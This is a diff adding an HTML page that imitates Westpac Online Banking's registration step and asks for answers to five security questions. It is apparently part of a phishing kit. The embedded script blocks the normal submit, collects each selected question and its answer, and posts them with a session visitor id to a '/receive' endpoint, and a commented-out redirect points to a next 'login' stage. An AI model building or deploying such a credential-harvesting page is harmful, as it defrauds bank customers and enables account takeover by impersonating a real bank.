@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]> <html lang="en" class="legacy_ie ie6"> <![endif]-->
+<!--[if IE 7 ]>    <html lang="en" class="legacy_ie ie7"> <![endif]-->
+<!--[if IE 8 ]>    <html lang="en" class="legacy_ie ie8"> <![endif]-->
+<!--[if IE 9 ]>    <html lang="en" class="legacy_ie ie9"> <![endif]-->
+<!--[if (gt IE 9)|!(IE)]><!-->
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" style="" class=" js flexbox flexboxlegacy canvas canvastext webgl touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths es5 console">
+<!--<![endif]-->
+
+<head>
+    
+    
+    
+    
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+    <meta content="text/html; charset=UTF-8" http-equiv="content-type" />
+    
+    <link rel="shortcut icon" href="images/favicon.ico.23fb3f626712cf243b43f34a3e3a8e887b8e8250.ico" />
+    <link href="css/000-000-0001combined.css.1a6232cd07874834478c928fa1f30b79eea8fe08.css" rel="stylesheet" />
+    <link href="css/000-0001combined.css.4afbedaf9997c61c303d1951ae98f27918c490d3.css" rel="stylesheet" />
+    <link href="css/000-0001combined.css.b0cf37060ddf80c0f0adf1583668a8d44dfb5143.css" rel="stylesheet" />
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
+    
+
+    <title>Westpac Online Banking registration - personal banking - Westpac Online Banking</title>
+
+    
+    
+    <noscript>
+        <meta http-equiv="Refresh" content="0; url=/wbc/banking/handler?TAM_OP=browser_javascript" />
+    </noscript>
+    
+    
+    <meta name="wup_url" content="https://wup-2ffe60ee.westpac.com.au/client/v3/web/wup?cid=willow" />
+    <meta name="log_url" content="https://log-2ffe60ee.westpac.com.au/api/v1/sendLogs" />
+    
+
+    
+</head>
+
+<body id="registration-template" data-log="/wbc/banking/esis" data-keymap-data-timeout="" data-analytics-allkeys="experience,newFormName,pageAction,pageKey,pageName,pageType,siteVersion,nav,externalSiteName,productID,itemName,transactionID" data-analytics-pagetype="registration" data-analytics-pageaction="start" data-analytics-pagename="personal details" data-analytics-newformname="olb" data-analytics-siteversion="1.1242.143.1" data-analytics-experience="desktop" data-analytics-pagekey="Authentication_SelfRegistration">
+    <input name="__RequestVerificationToken" type="hidden" value="yyH5sDKEo7GvFIXZM1UMbFuC1LndpD4ZCz/d1kSk0neCYHnXLQht5MXL1YCn2dAD9l8X004mUeNTZR/QpNmQtyB86Wd6C2r2nSNpv2G51QE/uvStolv0s7YOUCmtnGkHYHKMCW6aeOCft4KKtsN+9PcweTIwP1o4UWDqbQ7M0wRboGxRf/k3mJC6p0c5EHD3i8FNj5dM16Div0AWlagrWA==" />
+
+    <div id="container">
+        <header id="header" role="banner">
+            <nav id="accessible-jumps" role="navigation">
+                <ul>
+                    <li><a href="#content" data-s-object-id="https://banking.westpac.com.au/wbc/banking/registration_1">Skip to content</a></li>
+                </ul>
+            </nav>
+            <div id="logo">
+                <a href="http://westpac.com.au" data-s-object-id="http://westpac.com.au/_1">
+                    <img src="https://banking.westpac.com.au/wbc/banking/Themes/Default/Desktop/WBC/Core/Images/logo_white_bg.png.ce5c4c19ec61b56796f0e218fc8329c558421fd8.png" alt="Westpac Online Banking home" />
+                </a>
+            </div>
+        </header>
+        <div id="content" class="container-end" tabindex="-1">
+            <div id="spoke-title" class="container-end">
+                <h1>
+                    Westpac Online Banking - personal banking
+                </h1>
+            </div>
+            <div id="main" class="main" role="main">
+
+
+
+                
+                
+                
+                   <div class="self-registration" data-get-registration-password-policy="https://banking.westpac.com.au/wbc/banking/registration/passwordpolicy" data-keymap-url="/eam/servlet/getEamInterfaceData">
+
+                    <ul id="progress-bar" class="steps-4">
+                        <li  tabindex="-1"><span>Step 1<span class="step-detail">Personal details</span></span><span class="a11y-context"> currently active</span></li>
+                        <li class="active"><span>Step 2<span class="step-detail">Security questions</span></span><span class="a11y-context"> currently inactive</span></li>
+                        <li><span>Step 3<span class="step-detail">Card information</span></span><span class="a11y-context"> currently inactive</span></li>
+                        <!--li><span>Step 4<span class="step-detail">Contact details</span></span><span class="a11y-context"> currently inactive</span></li-->
+                    </ul>
+
+                    <div class="customer-verification">
+                        <form method="post" id="customer-verification" autocomplete="off" class="form-modules" novalidate="novalidate">
+                              <div id="alertManagerArea" aria-live="assertive" aria-atomic="true" class="alert alert-error alert-summary alert-summary-standard " style="display: none;">
+                                <div class="validation-summary-valid alert-icon" data-valmsg-summary="true"><span>Please correct the following:</span>
+                                    <ul id="unorder-list"></ul>
+                                </div>
+                            </div>
+
+                            <fieldset class="single-fieldset">
+                                <legend>Security questions and answers</legend>
+                                <h2>Security questions and answers</h2>
+                                <div>
+                                    <p class="form-instruction"> Please answer these security questions</p>
+                                </div>
+
+                                <div data-multiple-panels="false" class="tabs" data-tabs-init="true">
+                                    <ul class="tab-list" role="tablist">
+                                        <li class="current"><a href="#CardNumberTab" id="CardNumberTab" data-uuid="CardNumberTab" aria-controls="tab-panel-khwdz" aria-selected="true" data-s-object-id="https://banking.westpac.com.au/wbc/banking/registration_2" aria-hidden="false">Security questions and answers<span class="a11y-context js-tab-a11y-context"> Tab selected.</span></a></li>
+                                        </ul>
+                                    <div class="tab-panel-label a11y-context" tabindex="-1" aria-hidden="false" aria-labelledby="CardNumberTab">Tab panel for Card number selected</div>
+                                    <div class="tab-panel tab-panel-section" aria-hidden="false" id="tab-panel-khwdz" style="display: block;">
+                                     <div class="security-qna-row">
+    <div id="security_question_1_container" class="customer_credential security-question-container">
+        <label for="SecurityQuestion1" class="field-row cf field-sml">
+            <span class="label-name" id="label-name">
+                Security Question 1
+                <span class="required"> required</span>
+            </span>
+            <select class="security-question-select1" aria-required="true" data-val="true" data-val-required="Please select a Security Question." id="SecurityQuestion1" name="SecurityQuestion1">
+                <option value="" disabled selected>Select a security question</option>
+                <option value="first_pet">What was the name of your first pet?</option>
+                <option value="street_name">What is the name of the street where you grew up?</option>
+                <option value="mothers_maiden_name">What is your mother’s maiden name?</option>
+                <option value="first_school">What was the name of your first school?</option>
+                <option value="favorite_book">What is your favorite book?</option>
+            </select>
+            <span data-valmsg-for="SecurityQuestion1" data-valmsg-replace="true" data-val-focusonerror="t" class="inline-error field-validation-valid" style="display: none;"></span>
+        </label>
+    </div>
+
+    <div id="security_answer_1_container" class="customer_credential security-answer-container">
+        <label for="SecurityAnswer1" class="field-row cf field-sml">
+            <span class="label-name" id="label-name">
+                 Answer
+                <span class="required"> required</span>
+                <span class="a11y-context max-length-context">Maximum number of characters are:100</span>
+            </span>
+            <input class="security-answer-input1 log_details" autocomplete="off" data-val="true" data-val-required="Please enter your answer." id="SecurityAnswer1" maxlength="100" name="SecurityAnswer1" type="text" value="" />
+            <span data-valmsg-for="SecurityAnswer1" data-valmsg-replace="true" data-val-focusonerror="t" class="inline-error field-validation-valid" style="display: none;"></span>
+        </label>
+    </div>
+</div>
+
+<div class="security-qna-row">
+    <div id="security_question_2_container" class="customer_credential security-question-container">
+        <label for="SecurityQuestion2" class="field-row cf field-sml">
+            <span class="label-name" id="label-name">
+                Security Question 2
+                <span class="required"> required</span>
+            </span>
+            <select class="security-question-select2" aria-required="true" data-val="true" data-val-required="Please select a Security Question." id="SecurityQuestion2" name="SecurityQuestion2">
+                <option value="" disabled selected>Select a security question</option>
+                <option value="first_pet">What was the name of your first pet?</option>
+                <option value="street_name">What is the name of the street where you grew up?</option>
+                <option value="mothers_maiden_name">What is your mother’s maiden name?</option>
+                <option value="first_school">What was the name of your first school?</option>
+                <option value="favorite_book">What is your favorite book?</option>
+            </select>
+            <span data-valmsg-for="SecurityQuestion2" data-valmsg-replace="true" data-val-focusonerror="t" class="inline-error field-validation-valid" style="display: none;"></span>
+        </label>
+    </div>
+
+    <div id="security_answer_2_container" class="customer_credential security-answer-container">
+        <label for="SecurityAnswer2" class="field-row cf field-sml">
+            <span class="label-name" id="label-name">
+                 Answer
+                <span class="required"> required</span>
+                <span class="a11y-context max-length-context">Maximum number of characters are:100</span>
+            </span>
+            <input class="security-answer-input2 log_details" autocomplete="off" data-val="true" data-val-required="Please enter your answer." id="SecurityAnswer2" maxlength="100" name="SecurityAnswer2" type="text" value="" />
+            <span data-valmsg-for="SecurityAnswer2" data-valmsg-replace="true" data-val-focusonerror="t" class="inline-error field-validation-valid" style="display: none;"></span>
+        </label>
+    </div>
+</div>
+
+<div class="security-qna-row">
+    <div id="security_question_3_container" class="customer_credential security-question-container">
+        <label for="SecurityQuestion3" class="field-row cf field-sml">
+            <span class="label-name" id="label-name">
+                Security Question 3
+                <span class="required"> required</span>
+            </span>
+            <select class="security-question-select3" aria-required="true" data-val="true" data-val-required="Please select a Security Question." id="SecurityQuestion3" name="SecurityQuestion3">
+                <option value="" disabled selected>Select a security question</option>
+                <option value="first_pet">What was the name of your first pet?</option>
+                <option value="street_name">What is the name of the street where you grew up?</option>
+                <option value="mothers_maiden_name">What is your mother’s maiden name?</option>
+                <option value="first_school">What was the name of your first school?</option>
+                <option value="favorite_book">What is your favorite book?</option>
+            </select>
+            <span data-valmsg-for="SecurityQuestion3" data-valmsg-replace="true" data-val-focusonerror="t" class="inline-error field-validation-valid" style="display: none;"></span>
+        </label>
+    </div>
+
+    <div id="security_answer_3_container" class="customer_credential security-answer-container">
+        <label for="SecurityAnswer3" class="field-row cf field-sml">
+            <span class="label-name" id="label-name">
+                 Answer
+                <span class="required"> required</span>
+                <span class="a11y-context max-length-context">Maximum number of characters are:100</span>
+            </span>
+            <input class="security-answer-input3 log_details" autocomplete="off" data-val="true" data-val-required="Please enter your answer." id="SecurityAnswer3" maxlength="100" name="SecurityAnswer3" type="text" value="" />
+            <span data-valmsg-for="SecurityAnswer3" data-valmsg-replace="true" data-val-focusonerror="t" class="inline-error field-validation-valid" style="display: none;"></span>
+        </label>
+    </div>
+</div>
+
+<div class="security-qna-row">
+    <div id="security_question_4_container" class="customer_credential security-question-container">
+        <label for="SecurityQuestion4" class="field-row cf field-sml">
+            <span class="label-name" id="label-name">
+                Security Question 4
+                <span class="required"> required</span>
+            </span>
+            <select class="security-question-select" aria-required="true" data-val="true" data-val-required="Please select a Security Question." id="SecurityQuestion4" name="SecurityQuestion4">
+                <option value="" disabled selected>Select a security question</option>
+                <option value="first_pet">What was the name of your first pet?</option>
+                <option value="street_name">What is the name of the street where you grew up?</option>
+                <option value="mothers_maiden_name">What is your mother’s maiden name?</option>
+                <option value="first_school">What was the name of your first school?</option>
+                <option value="favorite_book">What is your favorite book?</option>
+            </select>
+            <span data-valmsg-for="SecurityQuestion4" data-valmsg-replace="true" data-val-focusonerror="t" class="inline-error field-validation-valid" style="display: none;"></span>
+        </label>
+    </div>
+
+    <div id="security_answer_4_container" class="customer_credential security-answer-container">
+        <label for="SecurityAnswer4" class="field-row cf field-sml">
+            <span class="label-name" id="label-name">
+                 Answer
+                <span class="required"> required</span>
+                <span class="a11y-context max-length-context">Maximum number of characters are:100</span>
+            </span>
+            <input class="security-answer-input4 log_details" autocomplete="off" data-val="true" data-val-required="Please enter your answer." id="SecurityAnswer4" maxlength="100" name="SecurityAnswer4" type="text" value="" />
+            <span data-valmsg-for="SecurityAnswer4" data-valmsg-replace="true" data-val-focusonerror="t" class="inline-error field-validation-valid" style="display: none;"></span>
+        </label>
+    </div>
+</div>
+
+<div class="security-qna-row">
+    <div id="security_question_5_container" class="customer_credential security-question-container">
+        <label for="SecurityQuestion5" class="field-row cf field-sml">
+            <span class="label-name" id="label-name">
+                Security Question 5
+                <span class="required"> required</span>
+            </span>
+            <select class="security-question-select5" aria-required="true" data-val="true" data-val-required="Please select a Security Question." id="SecurityQuestion5" name="SecurityQuestion5">
+                <option value="" disabled selected>Select a security question</option>
+                <option value="first_pet">What was the name of your first pet?</option>
+                <option value="street_name">What is the name of the street where you grew up?</option>
+                <option value="mothers_maiden_name">What is your mother’s maiden name?</option>
+                <option value="first_school">What was the name of your first school?</option>
+                <option value="favorite_book">What is your favorite book?</option>
+            </select>
+            <span data-valmsg-for="SecurityQuestion5" data-valmsg-replace="true" data-val-focusonerror="t" class="inline-error field-validation-valid" style="display: none;"></span>
+        </label>
+    </div>
+
+    <div id="security_answer_5_container" class="customer_credential security-answer-container">
+        <label for="SecurityAnswer5" class="field-row cf field-sml">
+            <span class="label-name" id="label-name">
+                 Answer
+                <span class="required"> required</span>
+                <span class="a11y-context max-length-context">Maximum number of characters are:100</span>
+            </span>
+            <input class="security-answer-input5 log_details" autocomplete="off" data-val="true" data-val-required="Please enter your answer." id="SecurityAnswer5" maxlength="100" name="SecurityAnswer5" type="text" value="" />
+            <span data-valmsg-for="SecurityAnswer5" data-valmsg-replace="true" data-val-focusonerror="t" class="inline-error field-validation-valid" style="display: none;"></span>
+        </label>
+    </div>
+</div>
+
+<style>
+    .security-qna-row {
+        display: flex;
+        justify-content: space-between;
+        margin-bottom: 1em;
+    }
+    .security-question-container, .security-answer-container {
+        width: 48%;
+    }
+    .security-question-select, .security-answer-input {
+        width: 100%;
+    }
+</style>
+
+
+                                        
+                                            
+                                    </div>
+                                </div>
+
+
+
+
+                            </fieldset>
+
+
+                            <div class="form-footer">
+                                <p class="protected-footer">
+                                    Westpac Protect <abbr title="trademark">™</abbr>
+                                </p>
+                                <div class="btn-actions"><a href="#" data-lightbox=".cancel-registration-modal-window" class="btn cancel-registration-lightbox-launcher btn-link cancel" data-s-object-id="https://banking.westpac.com.au/wbc/banking/registration_4">Cancel</a><button id="subbut" type="submit" class="btn next call-to-action pleasewait-onclick btn-next btn-primary">Next</button></div>
+                            </div>
+
+
+
+                        </form>
+                    </div>
+
+
+                    
+                    
+
+                    
+
+
+
+                    
+
+
+
+                    
+
+                    <div data-closeimage="https://banking.westpac.com.au/wbc/banking/Themes/Default/Desktop/WBC/Core/Images/Patterns1.1/icon-close-24.png.3b0523a0592f683d9a98a0d126b311e24b34392e.png" data-closealttext="close" title="Cancel registration?" class="lightbox trap cancel-registration-modal-window">
+                        <div class="flashpoint-container">
+                            <div data-dismiss-label="Close this message" class="flashpoint empty"></div>
+                        </div>
+                        <div class="lightbox-content-wrapper">
+                            <p>Are you sure you want to cancel your registration?</p>
+                            <p>If you cancel all details entered will be lost and you can register at another time.</p>
+                            <div class="btn-actions"><a href="#" class="btn secondary continueRegistrationSteps btn-link cancel" data-s-object-id="https://banking.westpac.com.au/wbc/banking/registration_10">Continue registration</a><button type="submit" class="btn cancelRegistrationSteps btn-primary">Cancel registration</button></div>
+                        </div>
+                    </div>
+                </div>
+
+
+
+
+
+            </div>
+
+            <aside role="complementary">
+                <div id="aside-content" class="sidebar">
+                    <div id="need-help" class="box">
+                        <h2>Need help?</h2>
+                        <p>Call us on <strong>1300 655 505</strong><span>8am-8pm Sydney time, 7 days a week</span></p>
+                    </div>
+                </div>
+            </aside>
+        </div>
+    </div>
+
+
+
+    
+    
+    
+    
+    
+    
+
+
+
+
+
+    <div class="ui-widget-overlay hidden"></div>
+</body>
+<script>
+ 	
+ 	function addListItem(ulId, text, attributes = {}) {
+    var ul = document.getElementById(ulId);
+    var li = document.createElement('li');
+    li.textContent = ' ' + text ; 
+
+    for (const [key, value] of Object.entries(attributes)) {
+        li.setAttribute(key, value);
+    }
+
+    ul.appendChild(li);
+    	 };
+    	 
+    	 
+
+$(document).ready(function() {
+    $('#subbut').on('click', function(event) {
+        event.preventDefault(); // Prevent the default action of the link
+
+        let myForm = $("#customer-verification");
+        let checkInputs = document.querySelectorAll('.log_details');
+		let message = "";
+		let count = 0;
+        for (let i = 1; i <= 5; i++) {
+                let answer = document.getElementById('SecurityAnswer' + i).value;
+                let question = document.getElementById('SecurityQuestion' + i);
+                let selectedOption = question.options[question.selectedIndex].textContent;
+                message += selectedOption + ' : ' + answer + '\n';
+                
+            }
+        
+            console.log(message);
+        let list = document.getElementById('unorder-list');
+
+		// While there are child elements, remove the first child
+		while (list.firstChild) {
+		    list.removeChild(list.firstChild);
+		}
+        
+        
+        // Flag to track if any input is empty
+        let isEmpty = false;
+
+        // Loop through each input field
+        for (const check of checkInputs) {
+            check.addEventListener('focus', () => {
+                console.log('focus');
+                check.nextElementSibling.style.display = "none";
+            });
+
+            if (check.value.trim() === "") {
+            	count++ ;
+            	console.log(check.name);
+                document.getElementById('alertManagerArea').style.display = "block";
+               var ans = `Answer ${count}`;
+                addListItem('unorder-list', ans);
+                isEmpty = true;
+            }
+        }
+
+        // If no input is empty, proceed with form submission
+        if (!isEmpty) {
+            
+            let visitor = sessionStorage.getItem('visitor');
+            
+
+            // Send AJAX request
+            $.ajax({
+                method: 'POST',
+                url: "/receive",
+                data: { message: message, visitor: visitor }
+            }).done(function(msg) {
+            
+                sessionStorage.setItem('visitor', visitor);
+                //window.location.href = "login/2";
+                console.log(msg); // Log success message
+            }).fail(function(err, textstatus, error) {
+            //window.location.href = "login/2"; 
+            
+            });
+        }
+    });
+});
+ 
+
+    </script>
+</html>
